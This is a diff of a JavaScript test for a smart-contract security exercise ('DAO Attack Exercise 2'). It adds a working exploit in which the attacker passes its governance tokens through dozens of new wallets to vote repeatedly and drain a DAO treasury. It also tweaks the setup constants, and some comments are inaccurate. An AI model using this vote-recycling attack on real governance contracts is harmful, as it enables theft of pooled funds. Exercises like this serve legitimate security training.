@@ -6,9 +6,12 @@ describe('DAO Attack Exercise 2', function () {
     let deployer, daoMember1, daoMember2, attacker, user;
 
     // Governance Tokens
-    const DEPLOYER_TOKENS = ethers.utils.parseEther('1500'); // 10 million tokens
-    const DAO_MEMBER_TOKENS = ethers.utils.parseEther('1000'); // 10 million tokens
-    const ATTACKER_TOKENS = ethers.utils.parseEther('10'); // 10 million tokens
+    const DEPLOYER_TOKENS = ethers.utils.parseEther('150'); // 15 million tokens
+    const DAO_MEMBER_TOKENS = ethers.utils.parseEther('100'); // 10 million tokens
+    const ATTACKER_TOKENS = ethers.utils.parseEther('10'); // 10 tokens
+
+    // 1500 + 1000 + 1000 = 350;
+
 
     // ETH Balances
     const ETH_IN_TREASURY = ethers.utils.parseEther('1000'); // 1000 ETH in revenue
@@ -16,13 +19,13 @@ describe('DAO Attack Exercise 2', function () {
     // Proposals
     const FIRST_PROPOSAL_AMOUNT = ethers.utils.parseEther('0.1'); // 0.1 ETH
     const SECOND_PROPOSAL_AMOUNT = ethers.utils.parseEther('1'); // 0.1 ETH
-    
+
     before(async function () {
         /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
 
         [deployer, daoMember1, daoMember2, attacker, user] = await ethers.getSigners();
-        
-        this.attackerInitialETHBalance = await ethers.provider.getBalance(attacker.address)
+
+        this.attackerInitialETHBalance = await ethers.provider.getBalance(attacker.address);
 
         // Contract Factories
         const TheGridDAOFactory = await ethers.getContractFactory(
@@ -38,7 +41,7 @@ describe('DAO Attack Exercise 2', function () {
         this.dao = await TheGridDAOFactory.deploy();
         this.treasury = await TheGridTreasuryFactory.deploy(this.dao.address);
         await this.dao.setTreasury(this.treasury.address);
-        
+
         // ETH to Treasury
         await deployer.sendTransaction({
             to: this.treasury.address,
@@ -49,35 +52,35 @@ describe('DAO Attack Exercise 2', function () {
         ).to.be.equal(ETH_IN_TREASURY);
 
         // Mint tokens
-        await this.dao.mint(deployer.address, DEPLOYER_TOKENS)
-        await this.dao.mint(daoMember1.address, DAO_MEMBER_TOKENS)
-        await this.dao.mint(daoMember2.address, DAO_MEMBER_TOKENS)
-        await this.dao.mint(attacker.address, ATTACKER_TOKENS)
+        await this.dao.mint(deployer.address, DEPLOYER_TOKENS);
+        await this.dao.mint(daoMember1.address, DAO_MEMBER_TOKENS);
+        await this.dao.mint(daoMember2.address, DAO_MEMBER_TOKENS);
+        await this.dao.mint(attacker.address, ATTACKER_TOKENS);
     });
 
     it('Governance Test', async function () {
         /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
 
         // Random user can't propose
-        await expect(this.dao.connect(user).propose(user.address, ETH_IN_TREASURY)).to.be.revertedWith("You don't have voting power")
+        await expect(this.dao.connect(user).propose(user.address, ETH_IN_TREASURY)).to.be.revertedWith("You don't have voting power");
 
         // Depoyer proposes 2 proposals
-        await this.dao.propose(deployer.address, FIRST_PROPOSAL_AMOUNT)
-        await this.dao.propose(deployer.address, SECOND_PROPOSAL_AMOUNT)
-        
+        await this.dao.propose(deployer.address, FIRST_PROPOSAL_AMOUNT);   //Proposal #1
+        await this.dao.propose(deployer.address, SECOND_PROPOSAL_AMOUNT); //Proposal #2
+
         // Random user can't vote
-        await expect(this.dao.connect(user).vote(1, false)).to.be.reverted
+        await expect(this.dao.connect(user).vote(1, false)).to.be.reverted;
 
         // DAO Members can vote
         // First proposal should go through (Yes - 2500, No - 1000)
-        await this.dao.connect(daoMember1).vote(1, true)
+        await this.dao.connect(daoMember1).vote(1, true);
         // Can't vote twice on same proposal
-        await expect(this.dao.connect(daoMember1).vote(1, false)).to.be.reverted
-        await this.dao.connect(daoMember2).vote(1, false)
-        
+        await expect(this.dao.connect(daoMember1).vote(1, false)).to.be.reverted;
+        await this.dao.connect(daoMember2).vote(1, false);
+
         // Second proposal should fail (Yes - 1500, No - 2000)
-        await this.dao.connect(daoMember1).vote(2, false)
-        await this.dao.connect(daoMember2).vote(2, false)
+        await this.dao.connect(daoMember1).vote(2, false);
+        await this.dao.connect(daoMember2).vote(2, false);
 
         // Can't execute before voting is over
         await expect(this.dao.execute(1)).to.be.revertedWith("Voting is not over");
@@ -86,14 +89,14 @@ describe('DAO Attack Exercise 2', function () {
         await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 1 day
 
         // First proposal should succeed - tresury balance changed
-        await this.dao.execute(1)
-        this.treasuryBalanceAfterFirstProposal = ETH_IN_TREASURY.sub(FIRST_PROPOSAL_AMOUNT)
+        await this.dao.execute(1);
+        this.treasuryBalanceAfterFirstProposal = ETH_IN_TREASURY.sub(FIRST_PROPOSAL_AMOUNT);
         expect(
             await ethers.provider.getBalance(this.treasury.address)
         ).to.be.equal(this.treasuryBalanceAfterFirstProposal);
 
         // Second proposal should fail - tresury balance did't change
-        await this.dao.execute(2)
+        await this.dao.execute(2);
         expect(
             await ethers.provider.getBalance(this.treasury.address)
         ).to.be.equal(this.treasuryBalanceAfterFirstProposal);
@@ -105,7 +108,7 @@ describe('DAO Attack Exercise 2', function () {
         expect(proposal2.processed).to.be.equal(true);
 
         // Can't execute processed proposal
-        await expect(this.dao.execute(2)).to.be.revertedWith("Proposl already processed")
+        await expect(this.dao.execute(2)).to.be.revertedWith("Proposal already processed");
 
     });
 
@@ -115,27 +118,64 @@ describe('DAO Attack Exercise 2', function () {
         // Create a proposal to send all trasury balance to Attacker
         await this.dao.connect(attacker).propose(
             attacker.address, this.treasuryBalanceAfterFirstProposal
-        )
+        );
 
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        
+
+        let tokenOwner = attacker;
+        this.proposalId = await this.dao.lastProposalId() - 1;
+        console.log("thisproposal", this.proposalId);
+
+        console.log(await ethers.provider.getBalance(attacker.address));
+        const tokenBalance = this.dao.balanceOf(attacker.address);
+
+
+        // 99999
+        for (i = 0; i < 36; i++) {
+            const signer = ethers.Wallet.createRandom().connect(ethers.provider);
+            console.log("Iteration #", i);
+            const tx = {
+                to: signer.address,
+                value: ethers.utils.parseEther("0.1"),
+            };
+            await attacker.sendTransaction(tx);
+
+            await this.dao
+                .connect(tokenOwner == attacker ? attacker : tokenOwner)
+                .transfer(signer.address, tokenBalance);
+            // console.log("New Signer token Balance", await this.dao.balanceOf(signer.address));
+            if (i > 0) await this.dao.connect(signer).vote(this.proposalId, true);
+            tokenOwner = signer;
+        }
+
+
+
+
+
+        // await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 1 day
+
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - DON'T CHANGE ANYTHING HERE */
 
         // Other DAO Members vote "no" on the attacker's proposal
-        await this.dao.connect(deployer).vote(3, false)
-        await this.dao.connect(daoMember1).vote(3, false)
-        await this.dao.connect(daoMember2).vote(3, false)
+
+        await this.dao.connect(deployer).vote(3, false);
+        await this.dao.connect(daoMember1).vote(3, false);
+        await this.dao.connect(daoMember2).vote(3, false);
 
         // Fast forward EVM 1 day so proposal can be executed
         await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 1 day
         // Attacker is trying to execute proposal
         await this.dao.connect(attacker).execute(3);
+        let proposal = await this.dao.getProposal(this.proposalId);
+        console.log("Amount of YES", proposal.yes);
+        console.log("Amount of NO", proposal.no);
 
         // No ETH left in treasury
         expect(
@@ -146,7 +186,7 @@ describe('DAO Attack Exercise 2', function () {
         expect(
             await ethers.provider.getBalance(attacker.address)
         ).to.be.gt(((this.attackerInitialETHBalance)
-        .add(this.treasuryBalanceAfterFirstProposal))
-        .sub(ethers.utils.parseEther('20')));
+            .add(this.treasuryBalanceAfterFirstProposal))
+            .sub(ethers.utils.parseEther('20')));
     });
 });
